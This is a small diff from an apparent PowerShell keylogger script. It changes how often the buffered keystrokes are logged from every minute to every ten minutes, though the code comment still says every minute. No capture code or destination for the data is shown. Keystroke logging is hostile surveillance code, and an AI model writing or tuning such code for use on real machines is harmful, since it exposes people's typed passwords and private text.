@@ -164,7 +164,7 @@ while ($true) {
 
     # Send logs every minute
     $elapsedTime = (Get-Date) - $startTime
-    if ($elapsedTime.TotalMinutes -ge 1) {
+    if ($elapsedTime.TotalMinutes -ge 10) {
         if ($keystrokeBuffer -ne "") {
             Log-Activity "[KEYSTROKES]: $keystrokeBuffer"
             $keystrokeBuffer = ""
